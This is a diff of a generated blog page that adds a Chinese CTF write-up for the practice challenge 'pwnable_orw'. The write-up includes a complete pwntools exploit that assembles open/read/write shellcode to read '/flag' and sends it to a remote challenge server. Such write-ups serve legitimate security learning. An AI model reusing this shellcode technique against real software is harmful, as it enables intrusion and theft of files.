@@ -83,7 +83,7 @@
                         <input id="switch_default" type="checkbox" class="switch_default">
                         <label for="switch_default" class="toggleBtn"></label>
             </div>
-            <form id="gridea-search-form" data-update="1601913876359" action="/search/index.html">
+            <form id="gridea-search-form" data-update="1601954705929" action="/search/index.html">
                 <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
             </form>
         </div>
@@ -102,7 +102,7 @@
                         <!--zh-->
                         <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
                     </div>
-                    <form id="gridea-search-form" data-update="1601913876359" action="/search/index.html">
+                    <form id="gridea-search-form" data-update="1601954705929" action="/search/index.html">
                         <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
                     </form>
                     <!--en-->
@@ -178,9 +178,9 @@
                                 Date: <a href="#">2020-09-07</a>
                             </span>
                                     <span class="post-readtime">Reading Time:<a
-                                    href="#">4.0
+                                    href="#">5.3
                                     mins</a></span>
-                                    <span class="post-words">words:<a href="#">775</a></span>
+                                    <span class="post-words">words:<a href="#">1004</a></span>
                                     
                                         <span class="post-category">
                                 Category:
@@ -410,6 +410,76 @@ show(0)
 
 p.interactive()
 </code></pre>
+<h2 id="pwnable_orw">pwnable_orw</h2>
+<p>题目直接bss可执行，让我们丢shellcode<br>
+但是加了个沙箱，只能用orw去读<br>
+真不戳真不戳，又从pwnki老师那儿学到了shellcraft的新姿势</p>
+<p><img src="https://l3mon629.github.io/post-images/1601954690030.png" alt="" loading="lazy"><br>
+<img src="https://l3mon629.github.io/post-images/1601954694481.png" alt="" loading="lazy"></p>
+<p>exp:</p>
+<pre><code class="language-python">from pwn import *
+
+local = 1
+binary = &quot;./orw&quot;
+
+if local == 0:
+	p = process(binary)
+else:
+	p = remote(&quot;node3.buuoj.cn&quot;,26316)
+
+def dbg():
+	context.log_level = 'debug'
+
+context.terminal = ['tmux','splitw','-h']
+context(arch = 'i386', os = 'linux')
+
+bss = 0x0804A060 + 0x100
+
+shellcode = shellcraft.open('/flag')
+# /* open(file='flag', oflag=0, mode=0) */
+#     /* push 'flag\x00' */
+#     push 1
+#     dec byte ptr [esp]
+#     push 0x67616c66
+#     mov ebx, esp
+#     xor ecx, ecx
+#     xor edx, edx
+#     /* call open() */
+#     push SYS_open /* 5 */
+#     pop eax
+#     int 0x80
+
+#shellcode += shellcraft.read('eax',bss,0x100)
+shellcode += shellcraft.read('eax','esp',0x100)
+# /* read(fd='eax', buf='esp', nbytes=256) */
+#     mov ebx, eax
+#     mov ecx, esp
+#     xor edx, edx
+#     mov dh, 0x100 &gt;&gt; 8
+#     /* call read() */
+#     push SYS_read /* 3 */
+#     pop eax
+#     int 0x80
+
+#shellcode += shellcraft.write(1,bss,0x100)
+shellcode += shellcraft.write(1,'esp',0x100)
+# /* write(fd=1, buf='esp', n=256) */
+#     push 1
+#     pop ebx
+#     mov ecx, esp
+#     xor edx, edx
+#     mov dh, 0x100 &gt;&gt; 8
+#     /* call write() */
+#     push SYS_write /* 4 */
+#     pop eax
+#     int 0x80
+
+shellcode = asm(shellcode)
+
+p.sendafter('Give my your shellcode:',shellcode)
+
+p.interactive()
+</code></pre>
 
                         </div>
                         
@@ -423,6 +493,7 @@ p.interactive()
 <li><a href="#black-watch-%E5%85%A5%E7%BE%A4%E9%A2%98pwn">[Black Watch 入群题]PWN</a></li>
 <li><a href="#wustctf2020_name_your_dog">wustctf2020_name_your_dog</a></li>
 <li><a href="#bjdctf_2020_ydsneedgrirlfriend">bjdctf_2020_YDSneedGrirlfriend</a></li>
+<li><a href="#pwnable_orw">pwnable_orw</a></li>
 </ul>
 </li>
 </ul>
@@ -456,8 +527,8 @@ p.interactive()
                                                     <i class="post-share"></i>
                                                     <span>Share:</span>
                                                         <a title="QR Code" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://l3mon629.github.io/post/buu-pwn2/"><i class="fa fa-qrcode"></i></a>
-                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=qzone&title=buu-pwn(2)&pics=https://l3mon629.github.io/images/avatar.png?v=1601913876359&summary="><i class="fa fa-qq"></i></a>
-                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=weibo&title=buu-pwn(2) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1601913876359 "><i class="fa fa-weibo "></i></a>
+                                                        <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=qzone&title=buu-pwn(2)&pics=https://l3mon629.github.io/images/avatar.png?v=1601954705929&summary="><i class="fa fa-qq"></i></a>
+                                                        <a title="Weibo" target="_blank" href="https://service.weibo.com/share/share.php?url=https://l3mon629.github.io/post/buu-pwn2/&sharesource=weibo&title=buu-pwn(2) + " - " + &pic="https://l3mon629.github.io/images/avatar.png?v=1601954705929 "><i class="fa fa-weibo "></i></a>
                                                         
                                                                 </span>
                                                                 <!--en-->
@@ -565,7 +636,7 @@ p.interactive()
                     CheckVersion();
                     
                     var newDate = new Date();
-                    newDate.setTime(1601913876359);
+                    newDate.setTime(1601954705929);
                     console.log(" Blog Update Time: " + newDate.toLocaleDateString());
                     console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
                 </script>
